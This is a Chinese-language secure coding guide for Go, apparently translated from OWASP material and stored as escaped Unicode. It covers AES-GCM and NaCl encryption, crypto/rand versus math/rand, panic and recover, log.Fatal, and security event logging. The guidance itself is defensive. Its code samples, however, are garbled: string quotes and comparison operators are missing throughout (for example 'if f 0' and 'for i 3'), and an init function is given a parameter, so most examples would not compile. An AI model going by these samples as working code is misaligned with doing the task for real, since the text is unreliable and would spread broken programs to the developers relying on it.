\u5f53\u60a8\u9700\u8981\u901a\u4fe1\u6216\u5b58\u50a8\u654f\u611f\u6570\u636e\u65f6\uff0c\u5e94\u4f7f\u7528\u52a0\u5bc6\uff0c\u60a8\u6216\u5176\u4ed6\u4eba\u7a0d\u540e\u9700\u8981\u8bbf\u95ee\u8fd9\u4e9b\u654f\u611f\u6570\u636e\u8fdb\u884c\u8fdb\u4e00\u6b65\u5904\u7406\u3002\u4e00\u4e2a\u201c\u7b80\u5355\u201d\u7684\u52a0\u5bc6\u7528\u4f8b\u662f\u5b89\u5168\u7684https-hyper-text\u4f20\u8f93\u534f\u8bae\u3002AES\u662f\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u7684\u4e8b\u5b9e\u6807\u51c6\u3002\u8be5\u7b97\u6cd5\u548c\u5176\u4ed6\u5bf9\u79f0\u5bc6\u7801\u4e00\u6837\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u6a21\u5f0f\u4e0b\u5b9e\u73b0\u3002\u60a8\u4f1a\u6ce8\u610f\u5230\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c\u4f7f\u7528\u4e86gcm\uff08galois counter\u6a21\u5f0f\uff09\uff0c\u800c\u4e0d\u662f\u66f4\u6d41\u884c\u7684\uff08\u81f3\u5c11\u5728\u5bc6\u7801\u5b66\u4ee3\u7801\u793a\u4f8b\u4e2d\uff09cbc/ecb\u3002GCM\u548cCBC/ECB\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u524d\u8005\u662f\u4e00\u79cd\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u5bc6\u7801\u6a21\u5f0f\uff0c\u8fd9\u610f\u5473\u7740\u5728\u52a0\u5bc6\u9636\u6bb5\u4e4b\u540e\uff0c\u5728\u5bc6\u6587\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u8eab\u4efd\u9a8c\u8bc1\u6807\u7b7e\uff0c\u7136\u540e\u5728\u6d88\u606f\u89e3\u5bc6\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u9a8c\u8bc1\uff0c\u4ee5\u786e\u4fdd\u6d88\u606f\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u60a8\u6709\u516c\u94a5\u5bc6\u7801\u672f\u6216\u4f7f\u7528\u6210\u5bf9\u5bc6\u94a5\u7684\u975e\u5bf9\u79f0\u5bc6\u7801\u672f\uff1apublic\u548cprivate\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u516c\u94a5\u5bc6\u7801\u5b66\u7684\u6027\u80fd\u4e0d\u5982\u5bf9\u79f0\u5bc6\u94a5\u5bc6\u7801\u5b66\uff0c\u56e0\u6b64\u5176\u6700\u5e38\u89c1\u7684\u7528\u4f8b\u662f\u4f7f\u7528\u975e\u5bf9\u79f0\u5bc6\u7801\u5b66\u5728\u53cc\u65b9\u4e4b\u95f4\u5171\u4eab\u5bf9\u79f0\u5bc6\u94a5\uff0c\u8fd9\u6837\u4ed6\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u5bf9\u79f0\u5bc6\u94a5\u4ea4\u6362\u4f7f\u7528\u5bf9\u79f0\u5bc6\u7801\u5b66\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u9664\u4e8690\u5e74\u4ee3\u7684AES\u6280\u672f\u5916\uff0cGo\u4f5c\u8005\u5df2\u7ecf\u5f00\u59cb\u5b9e\u65bd\u548c\u652f\u6301\u66f4\u73b0\u4ee3\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff0c\u8fd9\u4e9b\u7b97\u6cd5\u4e5f\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4f8b\u5982chacha20poly1305\u3002 Go\u4e2d\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u5305\u662fx/crypto/nacl\u3002\u8fd9\u662fDanielJ.Bernstein\u535a\u58eb\u7684Nacl\u56fe\u4e66\u9986\u7684\u53c2\u8003\u8d44\u6599\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u73b0\u4ee3\u5bc6\u7801\u5b66\u56fe\u4e66\u9986\u3002go\u4e2d\u7684nacl/box\u548cnacl/secretbox\u662fnacl\u4e3a\u4e24\u4e2a\u6700\u5e38\u89c1\u7684\u7528\u4f8b\u53d1\u9001\u52a0\u5bc6\u6d88\u606f\u7684\u62bd\u8c61\u5b9e\u73b0\uff1a \u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\uff08nacl/box\uff09\u5728\u53cc\u65b9\u4e4b\u95f4\u53d1\u9001\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u52a0\u5bc6\u6d88\u606f \u4f7f\u7528\u5bf9\u79f0\uff08\u5373\u5bc6\u94a5\uff09\u52a0\u5bc6\u6280\u672f\u5728\u53cc\u65b9\u4e4b\u95f4\u53d1\u9001\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u52a0\u5bc6\u6d88\u606f \u5982\u679c\u7b26\u5408\u60a8\u7684\u7528\u4f8b\uff0c\u90a3\u4e48\u6700\u597d\u4f7f\u7528\u5176\u4e2d\u4e00\u4e2a\u62bd\u8c61\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u4f7f\u7528AES\u3002 package main import fmt import crypto/aes import crypto/cipher import crypto/rand func main() { key := []byte( Encryption Key should be 32 char ) data := []byte( Welcome to Go Language Secure Coding Practices ) block, err := aes.NewCipher(key) if err != nil { panic(err.Error()) } nonce := make([]byte, 12) if _, err := rand.Read(nonce); err != nil { panic(err.Error()) } aesgcm, err := cipher.NewGCM(block) if err != nil { panic(err.Error()) } encrypted_data := aesgcm.Seal(nil, nonce, data, nil) fmt.Printf( Encrypted: %x\\n , encrypted_data) decrypted_data, err := aesgcm.Open(nil, nonce, encrypted_data, nil) if err != nil { panic(err.Error()) } fmt.Printf( Decrypted: %s\\n , decrypted_data) } Encrypted: a66bd44db1fac7281c33f6ca40494a320644584d0595e5a0e9a202f8aeb22dae659dc06932d4e409fe35a95d14b1cffacbe3914460dd27cbd274b0c3a561 Decrypted: Welcome to Go Language Secure Coding Practices \u8bf7\u6ce8\u610f\uff0c\u60a8\u5e94\u8be5\u201c\u5efa\u7acb\u5e76\u4f7f\u7528\u4e00\u4e2a\u5982\u4f55\u7ba1\u7406\u52a0\u5bc6\u5bc6\u94a5\u7684\u7b56\u7565\u548c\u8fc7\u7a0b\u201d\uff0c\u4fdd\u62a4\u201c\u4e3b\u79d8\u5bc6\u4e0d\u53d7\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u201d\u3002\u4e5f\u5c31\u662f\u8bf4\uff1a\u60a8\u7684\u52a0\u5bc6\u5bc6\u94a5\u4e0d\u5e94\u8be5\u786c\u7f16\u7801\u5728\u6e90\u4ee3\u7801\u4e2d\uff08\u5982\u672c\u4f8b\u4e2d\u6240\u793a\uff09\u3002 go crypto package \u6536\u96c6\u5e38\u89c1\u7684\u52a0\u5bc6\u5e38\u91cf\uff0c\u4f46\u5b9e\u73b0\u6709\u81ea\u5df1\u7684\u5305\uff0c\u5982crypto/md5\u5305\u3002 \u5927\u591a\u6570\u73b0\u4ee3\u5bc6\u7801\u7b97\u6cd5\u90fd\u662f\u5728 https://godoc.org/golang.org/x/crypto \u4e0b\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u5173\u6ce8\u90a3\u4e9b\u7b97\u6cd5\uff0c\u800c\u4e0d\u662f [crypto/*package](https://golang.org/pkg/crypto/) \u3002 \u4f2a\u968f\u673a\u751f\u6210\u5668 \u5728OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u4e2d\uff0c\u60a8\u4f1a\u53d1\u73b0\u4e00\u6761\u4f3c\u4e4e\u975e\u5e38\u590d\u6742\u7684\u51c6\u5219\uff1a\u201c\u5f53\u8fd9\u4e9b\u968f\u673a\u503c\u4e0d\u53ef\u731c\u6d4b\u65f6\uff0c\u6240\u6709\u968f\u673a\u6570\u3001\u968f\u673a\u6587\u4ef6\u540d\u3001\u968f\u673aguid\u548c\u968f\u673a\u5b57\u7b26\u4e32\u90fd\u5e94\u4f7f\u7528\u52a0\u5bc6\u6a21\u5757\u6279\u51c6\u7684\u968f\u673a\u6570\u751f\u6210\u5668\u751f\u6210\u201d\uff0c\u56e0\u6b64\u8ba9\u6211\u4eec\u6765\u8c08\u8c08\u201c\u968f\u673a\u6570\u201d\u3002 \u5bc6\u7801\u5b66\u4f9d\u8d56\u4e8e\u67d0\u79cd\u968f\u673a\u6027\uff0c\u4f46\u4e3a\u4e86\u6b63\u786e\u8d77\u89c1\uff0c\u5927\u591a\u6570\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u73b0\u6210\u7684\u662f\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff1a go's math/rand \u4e0d\u4f8b\u5916\u3002 \u5f53\u6587\u6863\u4e2d\u58f0\u660e\u201c\u9876\u7ea7\u51fd\u6570\uff08\u5982float64\u548cint\uff09\u4f7f\u7528\u9ed8\u8ba4\u5171\u4eab\u6e90\u65f6\uff0c\u60a8\u5e94\u8be5\u4ed4\u7ec6\u9605\u8bfb\u8be5\u6587\u6863\uff0c\u8be5\u5171\u4eab\u6e90\u6bcf\u6b21\u8fd0\u884c\u7a0b\u5e8f\u65f6\u90fd\u4f1a\u751f\u6210\u786e\u5b9a\u7684\u503c\u5e8f\u5217\u3002\u201d\uff08 source \uff09 \u8fd9\u5230\u5e95\u662f\u4ec0\u4e48\u610f\u601d\uff1f\u8ba9\u6211\u4eec\u770b\u770b package main import fmt import math/rand func main() { fmt.Println( Random Number: , rand.Intn(1984)) } \u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u51e0\u6b21\u4f1a\u5bfc\u81f4\u5b8c\u5168\u76f8\u540c\u7684\u6570\u5b57/\u5e8f\u5217\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f $ for i in {1..5}; do go run rand.go; done Random Number: 1825 Random Number: 1825 Random Number: 1825 Random Number: 1825 Random Number: 1825 \u56e0\u4e3a Go's Math/Rand \u548c\u5176\u4ed6\u8bb8\u591a\u65b9\u6cd5\u4e00\u6837\u662f\u4e00\u4e2a\u786e\u5b9a\u6027\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u6240\u4ee5\u5b83\u4eec\u4f7f\u7528\u4e00\u4e2a\u79f0\u4e3aseed\u7684\u6e90\u3002\u8fd9\u4e2a\u79cd\u5b50\u53ea\u8d1f\u8d23\u786e\u5b9a\u6027\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u968f\u673a\u6027\u2014\u2014\u5982\u679c\u5df2\u77e5\u6216\u53ef\u9884\u6d4b\uff0c\u751f\u6210\u7684\u6570\u5b57\u5e8f\u5217\u4e5f\u4f1a\u53d1\u751f\u540c\u6837\u7684\u60c5\u51b5\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 math/rand seed function \u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u6267\u884c\u83b7\u53d6\u9884\u671f\u7684\u4e94\u4e2a\u4e0d\u540c\u503c\u6765\u201c\u4fee\u590d\u201d\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4f46\u662f\u56e0\u4e3a\u6211\u4eec\u5728cryptographic practices\u90e8\u5206\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u9075\u5faa go's crypto/rand package \u3002 package main import fmt import math/big import crypto/rand func main() { rand, err := rand.Int(rand.Reader, big.NewInt(1984)) if err != nil { panic(err) } fmt.Printf( Random Number: %d\\n , rand) } \u60a8\u53ef\u80fd\u4f1a\u6ce8\u610f\u5230\u8fd0\u884c crypto/rand \u6bd4 math/rand \u6162\uff0c\u4f46\u8fd9\u662f\u610f\u6599\u4e4b\u4e2d\u7684\uff1a\u6700\u5feb\u7684\u7b97\u6cd5\u5e76\u4e0d\u603b\u662f\u6700\u5b89\u5168\u7684\u3002crypto\u7684rand\u5b9e\u73b0\u8d77\u6765\u4e5f\u66f4\u5b89\u5168\uff1b\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c\u60a8\u4e0d\u80fd\u79cd\u5b50crypto/rand\uff0c\u5e93\u4e3a\u6b64\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u968f\u673a\u6027\uff0c\u9632\u6b62\u5f00\u53d1\u4eba\u5458\u6ee5\u7528\u3002 $ for i in {1..5}; do go run rand-safe.go; done Random Number: 277 Random Number: 1572 Random Number: 1793 Random Number: 1328 Random Number: 1378 \u5982\u679c\u60a8\u5bf9\u5982\u4f55\u5229\u7528\u8fd9\u4e00\u70b9\u5f88\u597d\u5947\uff0c\u90a3\u4e48\u60f3\u60f3\u5982\u679c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u7528\u6237\u6ce8\u518c\u65f6\u521b\u5efa\u4e00\u4e2a\u9ed8\u8ba4\u5bc6\u7801\uff0c\u901a\u8fc7\u8ba1\u7b97\u7528 go's math/rand \u751f\u6210\u7684\u4f2a\u968f\u673a\u6570\u7684\u6563\u5217\u503c\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u60c5\u51b5\uff0c\u5982\u7b2c\u4e00\u4e2a\u793a\u4f8b\u6240\u793a\uff1f \u662f\u7684\uff0c\u4f60\u731c\u5bf9\u4e86\uff0c\u4f60\u5c31\u53ef\u4ee5\u9884\u6d4b\u7528\u6237\u7684\u5bc6\u7801\u4e86\uff01 \u9519\u8bef\u5904\u7406\u548c\u8bb0\u5f55 \u9519\u8bef\u5904\u7406\u548c\u65e5\u5fd7\u8bb0\u5f55\u662f\u5e94\u7528\u7a0b\u5e8f\u548c\u57fa\u7840\u7ed3\u6784\u4fdd\u62a4\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u5f53\u63d0\u5230\u9519\u8bef\u5904\u7406\u65f6\uff0c\u5b83\u662f\u6307\u6355\u83b7\u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\u4e2d\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83\u7684\u4efb\u4f55\u9519\u8bef\uff0c\u9664\u975e\u6b63\u786e\u5904\u7406\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u65e5\u5fd7\u8bb0\u5f55\u8be6\u7ec6\u8bf4\u660e\u4e86\u7cfb\u7edf\u4e0a\u53d1\u751f\u7684\u6240\u6709\u64cd\u4f5c\u548c\u8bf7\u6c42\u3002\u65e5\u5fd7\u8bb0\u5f55\u4e0d\u4ec5\u5141\u8bb8\u8bc6\u522b\u5df2\u53d1\u751f\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u800c\u4e14\u6709\u52a9\u4e8e\u786e\u5b9a\u9700\u8981\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u4fdd\u62a4\u7cfb\u7edf\u3002\u7531\u4e8e\u653b\u51fb\u8005\u6709\u65f6\u8bd5\u56fe\u901a\u8fc7\u5220\u9664\u65e5\u5fd7\u6765\u5220\u9664\u5176\u64cd\u4f5c\u7684\u6240\u6709\u8ddf\u8e2a\uff0c\u56e0\u6b64\u96c6\u4e2d\u5316\u65e5\u5fd7\u81f3\u5173\u91cd\u8981\u3002 \u9519\u8bef\u5904\u7406 \u5728Go\u4e2d\uff0c\u6709\u4e00\u4e2a\u5185\u7f6e\u7684 error \u7c7b\u578b\u3002 error \u7c7b\u578b\u7684\u4e0d\u540c\u503c\u8868\u793a\u5f02\u5e38\u72b6\u6001\u3002\u901a\u5e38\u5728go\u4e2d\uff0c\u5982\u679c\u9519\u8bef\u503c\u4e0d\u662fnil\uff0c\u5219\u4f1a\u53d1\u751f\u4e00\u4e2a\u9519\u8bef\uff0c\u5e76\u4e14\u5fc5\u987b\u8fdb\u884c\u5904\u7406\uff0c\u4ee5\u4fbf\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u5728\u4e0d\u5d29\u6e83\u7684\u60c5\u51b5\u4e0b\u4ece\u6240\u8ff0\u72b6\u6001\u6062\u590d\u3002 Go\u4e2d\u7684\u4e00\u4e2a\u7b80\u5355\u793a\u4f8b\u5982\u4e0b\uff1a if err != nil { // handle the error } \u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u9519\u8bef\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u81ea\u5df1\u7684\u9519\u8bef\u7c7b\u578b\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528erro.New \u51fd\u6570\u3002\u4f8b\u5b50\uff1a {...} if f 0 { return 0, errors.New( math: square root of negative number ) } //If an error has occurred print it if err != nil { fmt.Println(err) } {...} \u4e3a\u4e86\u9632\u6b62\u6211\u4eec\u9700\u8981\u683c\u5f0f\u5316\u5305\u542b\u65e0\u6548\u53c2\u6570\u7684\u5b57\u7b26\u4e32\u6765\u67e5\u770b\u662f\u4ec0\u4e48\u5bfc\u81f4\u4e86\u9519\u8bef\uff0c fmt \u5305\u4e2d\u7684 errorf \u51fd\u6570\u5141\u8bb8\u6211\u4eec\u8fd9\u6837\u505a\u3002 {...} if f 0 { return 0, fmt.Errorf( math: square root of negative number %g , f) } {...} \u5728\u5904\u7406\u9519\u8bef\u65e5\u5fd7\u65f6\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u786e\u4fdd\u5728\u9519\u8bef\u54cd\u5e94\u4e2d\u4e0d\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\uff0c\u5e76\u786e\u4fdd\u6ca1\u6709\u9519\u8bef\u5904\u7406\u7a0b\u5e8f\u6cc4\u6f0f\u4fe1\u606f\uff08\u4f8b\u5982\u8c03\u8bd5\u6216\u5806\u6808\u8ddf\u8e2a\u4fe1\u606f\uff09\u3002 \u5728Go\u4e2d\u8fd8\u6709\u989d\u5916\u7684\u9519\u8bef\u5904\u7406\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u662f\u6050\u614c\u3001\u6062\u590d\u548c\u5ef6\u8fdf\u3002\u5f53\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5904\u4e8e\u6b7b\u673a\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u6b63\u5e38\u6267\u884c\u88ab\u4e2d\u65ad\uff0c\u4efb\u4f55\u5ef6\u8fdf\u8bed\u53e5\u88ab\u6267\u884c\uff0c\u7136\u540e\u51fd\u6570\u8fd4\u56de\u7ed9\u5b83\u7684\u8c03\u7528\u65b9\u3002recover\u901a\u5e38\u5728defer\u8bed\u53e5\u4e2d\u4f7f\u7528\uff0c\u5e76\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u91cd\u65b0\u83b7\u5f97\u5bf9\u6050\u614c\u4f8b\u7a0b\u7684\u63a7\u5236\u6743\uff0c\u7136\u540e\u8fd4\u56de\u6b63\u5e38\u6267\u884c\u3002\u4ee5\u4e0b\u4ee3\u7801\u6bb5\u57fa\u4e8eGo\u6587\u6863\u89e3\u91ca\u4e86\u6267\u884c\u6d41\u7a0b\uff1a func main () { start() fmt.Println( Returned normally from start(). ) } func start () { defer func () { if r := recover(); r != nil { fmt.Println( Recovered in start() ) } }() fmt.Println( Called start() ) part2(0) fmt.Println( Returned normally from part2(). ) } func part2 (i int) { if i 0 { fmt.Println( Panicking in part2()! ) panic(fmt.Sprintf( %v , i)) } defer fmt.Println( Defer in part2() ) fmt.Println( Executing part2() ) part2(i + 1) } \u8f93\u51fa\uff1a Called start() Executing part2() Panicking in part2()! Defer in part2() Recovered in start() Returned normally from start(). \u901a\u8fc7\u68c0\u67e5\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230Go\u5982\u4f55\u5904\u7406\u7d27\u6025\u60c5\u51b5\u5e76\u4ece\u4e2d\u6062\u590d\uff0c\u4ece\u800c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u6062\u590d\u5176\u6b63\u5e38\u72b6\u6001\u3002\u8fd9\u4e9b\u51fd\u6570\u5141\u8bb8\u4ece\u539f\u672c\u4e0d\u53ef\u6062\u590d\u7684\u6545\u969c\u4e2d\u8fdb\u884c\u4f18\u96c5\u7684\u6062\u590d\u3002 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5ef6\u8fdf\u4f7f\u7528\u8fd8\u5305\u62ec\u4e92\u65a5\u9501\u89e3\u9501\uff0c\u6216\u8005\u5728\u6267\u884c\u4e86\u5468\u56f4\u7684\u51fd\u6570\uff08\u4f8b\u5982\u9875\u811a\uff09\u4e4b\u540e\u52a0\u8f7d\u5185\u5bb9\u3002 \u5728\u65e5\u5fd7\u5305\u4e2d\u8fd8\u6709\u4e00\u4e2alog.fatal\u3002\u81f4\u547d\u7ea7\u522b\u662f\u6709\u6548\u5730\u8bb0\u5f55\u6d88\u606f\uff0c\u7136\u540e\u8c03\u7528os.exit\uff081\uff09\u3002\u8fd9\u610f\u5473\u7740\uff1a \u5c06\u4e0d\u6267\u884cdefer\u8bed\u53e5\u3002 \u7f13\u51b2\u533a\u5c06\u4e0d\u4f1a\u88ab\u5237\u65b0\u3002 \u4e0d\u4f1a\u5220\u9664\u4e34\u65f6\u6587\u4ef6\u548c\u76ee\u5f55\u3002 \u8003\u8651\u5230\u524d\u9762\u63d0\u5230\u7684\u6240\u6709\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230log.fatal\u4e0e\u6050\u614c\u7684\u533a\u522b\uff0c\u4ee5\u53ca\u5e94\u8be5\u8c28\u614e\u4f7f\u7528\u5b83\u7684\u539f\u56e0\u3002\u53ef\u80fd\u4f7f\u7528log.fatal\u7684\u4e00\u4e9b\u793a\u4f8b\u5305\u62ec\uff1a \u8bbe\u7f6e\u65e5\u5fd7\u8bb0\u5f55\u5e76\u68c0\u67e5\u6211\u4eec\u662f\u5426\u6709\u5065\u5168\u7684\u73af\u5883\u548c\u53c2\u6570\u3002\u5982\u679c\u6211\u4eec\u4e0d\u8fd9\u6837\u505a\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u6267\u884cmain\uff08\uff09\u3002 \u4e00\u4e2a\u6c38\u8fdc\u4e0d\u4f1a\u53d1\u751f\u7684\u9519\u8bef\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u662f\u4e0d\u53ef\u6062\u590d\u7684\u3002 \u5982\u679c\u4e00\u4e2a\u975e\u4ea4\u4e92\u8fdb\u7a0b\u9047\u5230\u9519\u8bef\u800c\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u65e0\u6cd5\u5c06\u6b64\u9519\u8bef\u901a\u77e5\u7528\u6237\u3002\u6700\u597d\u5148\u505c\u6b62\u6267\u884c\uff0c\u7136\u540e\u518d\u4ece\u5931\u8d25\u4e2d\u51fa\u73b0\u5176\u4ed6\u95ee\u9898\u3002 \u521d\u59cb\u5316\u5931\u8d25\u7684\u4f8b\u5b50\u8bf4\u660e\uff1a func init(i int) { ... //This is just to deliberately crash the function. if i 2 { fmt.Printf( Var %d - initialized\\n , i) } else { //This was never supposed to happen, so we'll terminate our program. log.Fatal( Init failure - Terminating. ) } } func main() { i := 1 for i 3 { init(i) i++ } fmt.Println( Initialized all variables successfully ) \u91cd\u8981\u7684\u662f\u8981\u786e\u4fdd\u5728\u4e0e\u5b89\u5168\u63a7\u5236\u76f8\u5173\u8054\u7684\u9519\u8bef\u60c5\u51b5\u4e0b\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u62d2\u7edd\u8bbf\u95ee\u3002 \u65e5\u5fd7 \u65e5\u5fd7\u8bb0\u5f55\u5e94\u59cb\u7ec8\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\uff0c\u4e0d\u5e94\u4f9d\u8d56\u670d\u52a1\u5668\u914d\u7f6e\u3002 \u6240\u6709\u65e5\u5fd7\u8bb0\u5f55\u90fd\u5e94\u8be5\u7531\u53d7\u4fe1\u4efb\u7cfb\u7edf\u4e0a\u7684\u4e3b\u4f8b\u7a0b\u5b9e\u73b0\uff0c\u5f00\u53d1\u4eba\u5458\u8fd8\u5e94\u8be5\u786e\u4fdd\u65e5\u5fd7\u4e2d\u4e0d\u5305\u542b\u654f\u611f\u6570\u636e\uff08\u4f8b\u5982\u5bc6\u7801\u3001\u4f1a\u8bdd\u4fe1\u606f\u3001\u7cfb\u7edf\u8be6\u7ec6\u4fe1\u606f\u7b49\uff09\uff0c\u4e5f\u4e0d\u5b58\u5728\u4efb\u4f55\u8c03\u8bd5\u6216\u5806\u6808\u8ddf\u8e2a\u4fe1\u606f\u3002\u6b64\u5916\uff0c\u65e5\u5fd7\u8bb0\u5f55\u5e94\u8be5\u5305\u62ec\u6210\u529f\u548c\u5931\u8d25\u7684\u5b89\u5168\u4e8b\u4ef6\uff0c\u91cd\u70b9\u662f\u91cd\u8981\u7684\u65e5\u5fd7\u4e8b\u4ef6\u6570\u636e\u3002 \u91cd\u8981\u4e8b\u4ef6\u6570\u636e\u901a\u5e38\u6307\uff1a \u6240\u6709\u8f93\u5165\u9a8c\u8bc1\u5931\u8d25\u3002 \u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\uff0c\u5c24\u5176\u662f\u5931\u8d25\u3002 \u6240\u6709\u8bbf\u95ee\u63a7\u5236\u5931\u8d25\u3002 \u6240\u6709\u660e\u663e\u7684\u7be1\u6539\u4e8b\u4ef6\uff0c\u5305\u62ec\u5bf9\u72b6\u6001\u6570\u636e\u7684\u610f\u5916\u66f4\u6539\u3002 \u4f7f\u7528\u65e0\u6548\u6216\u8fc7\u671f\u7684\u4f1a\u8bdd\u4ee4\u724c\u8fdb\u884c\u8fde\u63a5\u7684\u6240\u6709\u5c1d\u8bd5\u3002 \u6240\u6709\u7cfb\u7edf\u5f02\u5e38\u3002 \u6240\u6709\u7ba1\u7406\u529f\u80fd\uff0c\u5305\u62ec\u5bf9\u5b89\u5168\u914d\u7f6e\u8bbe\u7f6e\u7684\u66f4\u6539\u3002 \u6240\u6709\u540e\u7aefTLS\u8fde\u63a5\u6545\u969c\u548c\u52a0\u5bc6\u6a21\u5757\u6545\u969c\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u65e5\u5fd7\u793a\u4f8b\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff1a func main() { var buf bytes.Buffer var RoleLevel int logger := log.New( buf, logger: , log.Lshortfile) fmt.Println( Please enter your user level. ) fmt.Scanf( %d , RoleLevel) // --- example switch RoleLevel { case 1: // Log successful login logger.Printf( Login successfull. ) fmt.Print( buf) case 2: // Log unsuccessful Login logger.Printf( Login unsuccessful - Insufficient access level. ) fmt.Print( buf) default: // Unspecified error logger.Print( Login error. ) fmt.Print( buf) } } \u5b9e\u73b0\u901a\u7528\u9519\u8bef\u6d88\u606f\u6216\u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u4e5f\u662f\u4e00\u4e2a\u597d\u7684\u5b9e\u8df5\uff0c\u4ee5\u786e\u4fdd\u5728\u53d1\u751f\u9519\u8bef\u65f6\u4e0d\u4f1a\u6cc4\u6f0f\u4efb\u4f55\u4fe1\u606f\u3002 \u6839\u636e\u6587\u6863\uff0c Go log package \u201c\u5b9e\u73b0\u7b80\u5355\u7684\u65e5\u5fd7\u8bb0\u5f55\u201d\uff0c\u7f3a\u5c11\u4e00\u4e9b\u5e38\u89c1\u548c\u91cd\u8981\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u7ea7\u522b\u5316\u7684\u65e5\u5fd7\u8bb0\u5f55\uff08\u4f8b\u5982\uff0c\u8c03\u8bd5\u3001\u4fe1\u606f\u3001\u8b66\u544a\u3001\u9519\u8bef\u3001\u81f4\u547d\u3001\u6b7b\u673a\uff09\u548c\u683c\u5f0f\u5316\u7a0b\u5e8f\u652f\u6301\uff08\u4f8b\u5982\uff0clogstash\uff09\uff1a\u8fd9\u662f\u4f7f\u65e5\u5fd7\u53ef\u7528\u7684\u4e24\u4e2a\u91cd\u8981\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u7528\u4e8e\u4e0e\u5b89\u5168\u4fe1\u606f\u548c\u4e8b\u4ef6\u96c6\u6210\uff09\u7ba1\u7406\u4f53\u7cfb\uff09\u3002 \u5927\u591a\u6570\uff08\u5982\u679c\u4e0d\u662f\u5168\u90e8\uff09\u7b2c\u4e09\u65b9\u65e5\u5fd7\u8bb0\u5f55\u5305\u90fd\u63d0\u4f9b\u8fd9\u4e9b\u529f\u80fd\u548c\u5176\u4ed6\u529f\u80fd\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u540e\u6d41\u884c\u7684\u7b2c\u4e09\u65b9\u65e5\u5fd7\u8bb0\u5f55\u5305\uff1a Logrus - https://github.com/Sirupsen/logrus glog - https://github.com/golang/glog loggo - https://github.com/juju/loggo \u5173\u4e8e Go's log package 